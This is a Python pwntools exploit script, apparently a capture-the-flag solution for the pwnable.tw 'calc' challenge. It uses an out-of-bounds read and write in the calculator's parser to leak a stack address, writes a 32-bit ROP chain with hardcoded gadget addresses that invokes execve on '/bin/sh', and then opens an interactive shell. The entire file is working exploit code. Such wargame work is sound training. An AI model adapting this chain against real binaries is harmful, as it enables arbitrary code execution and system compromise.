from pwn import *

base = 361
base_mem=None

def read_mem(proc, offset):
    proc.writeline("+{}".format(base+offset))
    result = proc.read()
    print(result)
    return int(result)

def write_mem(proc, offset, value):
    byte = bytes(bytearray.fromhex(value))
    orig = read_mem(proc, offset)
    actual = struct.unpack(">i", byte)[0]
    print(actual)
    diff = actual - orig

    if diff > 0:
        proc.writeline("+{}+{}".format(base+offset, diff))
    elif diff < 0:
        proc.writeline("+{}-{}".format(base+offset, -diff))
    else:
        return

    proc.read()

proc = remote("chall.pwnable.tw", port=10100)
#proc = process(["gdbserver", "localhost:1234", "calc"]); proc.read(); proc.read()
#proc = process("calc")
print(proc.read())

"""
eax <- 0b
ebx <- */bin/bash
ecx <- 0
edx <- 0

pop eax ; ret [0x0805c34b]
|_0b
pop edx ; ret [0x080701aa]
|_0
pop ecx ; pop ebx ; ret [0x080701d1]
|_0
|_POINTER_TO_BIN_BASH
int 0x80 [0x08049a21]
|\bin\sh
"""

def tohex(val, nbits):
  return hex((val + (1 << nbits)) % (1 << nbits))

start = int(tohex(read_mem(proc, -1) - 0x1C, 32), 16)

write_mem(proc, 0, "0805c34b")

write_mem(proc, 1, "0000000b")

write_mem(proc, 2, "080701aa")

write_mem(proc, 3, hex(start + 12 * 4)[2:])

write_mem(proc, 4, "080701d1")

write_mem(proc, 5, hex(start + 8 * 4)[2:])

write_mem(proc, 6, hex(start + 10 * 4)[2:])

write_mem(proc, 7, "08049a21")

write_mem(proc, 8, hex(start + 10 * 4)[2:])

write_mem(proc, 9, "00000000")

write_mem(proc, 10, "69622f2f")

write_mem(proc, 11, "68732f6e")

write_mem(proc, 12, "00000000")

proc.writeline()

proc.interactive()